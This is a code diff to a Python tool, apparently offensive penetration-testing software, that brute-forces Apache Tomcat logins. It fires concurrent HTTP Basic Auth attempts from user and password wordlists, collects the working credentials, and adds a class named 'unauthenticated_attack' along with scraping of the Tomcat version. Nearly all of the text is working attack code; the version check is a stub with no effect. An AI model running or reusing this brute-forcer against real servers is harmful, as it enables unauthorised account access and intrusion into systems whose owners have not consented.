@@ -1,8 +1,10 @@
 import argparse
+import re
 import sys
 import concurrent.futures
 import requests
 from requests.auth import HTTPBasicAuth
+from packaging.version import Version
 
 from rich.console import Console
 from rich.text import Text
@@ -88,6 +90,10 @@ class output_class:
         match state:
             case "credit":
                 text.append(f"[+] ", style="pale_turquoise1")
+            case "info":
+                text.append("[")
+                text.append("INFO", style="yellow")
+                text.append("] ")
             case "success":
                 text.append(f"[+] ", style="bright_green")
             case "failed":
@@ -106,11 +112,9 @@ class output_class:
 
 
 # Tomcat class
-class Tomcat:
-    def __init__(self, url: str, userlist: str, wordlist: str):
+class tomcat:
+    def __init__(self, url: str):
         self.url = url
-        self.userlist = userlist
-        self.wordlist = wordlist
 
     def login(self, username, password):
         auth = HTTPBasicAuth(username, password)
@@ -121,6 +125,21 @@ class Tomcat:
         else:
             output.verbose(state="failed", description=f"{username}:{password}", clear_previous_line=False)
             return None
+
+    def version_detection(self):
+        response = requests.get(f"{self.url}")
+        version = re.search(r"(\d.\d.\d\d)", response.text)[1]
+
+        output.message(state="info", description=f"version: {version}", clear_previous_line=False)
+
+        return version
+
+
+class unauthenticated_attack(tomcat):
+    def __init__(self, url: str, wordlist: str, userlist: str):
+        super().__init__(url)
+        self.userlist = userlist
+        self.wordlist = wordlist
 
     def brute_force(self):
         if self.userlist is None:
@@ -139,7 +158,7 @@ class Tomcat:
             for username in self.userlist:
                 for password in passwords:
                     password = password.strip()
-                    task = executor.submit(self.login, username, password)
+                    task = executor.submit(super().login, username, password)
                     tasks.append(task)
 
             credentials = []
@@ -195,6 +214,12 @@ def main():
     # banner draw of the tool
     print(banner())
 
+    tomcat_instance = tomcat(url=args.url)
+
+    if Version(tomcat_instance.version_detection()) < Version("10"):
+        # make something with it later
+        pass
+
     # switch for mode
     match args.mode:
         # settings for brute mode
@@ -204,7 +229,7 @@ def main():
             else:
                 output.message("success", "Mode Brute selected", False)
 
-                tomcat_instance = Tomcat(args.url, args.userlist, args.wordlist)
+                tomcat_instance = unauthenticated_attack(url=args.url, wordlist=args.wordlist, userlist=args.userlist)
                 credentials_found = tomcat_instance.brute_force()
 
                 if not credentials_found:
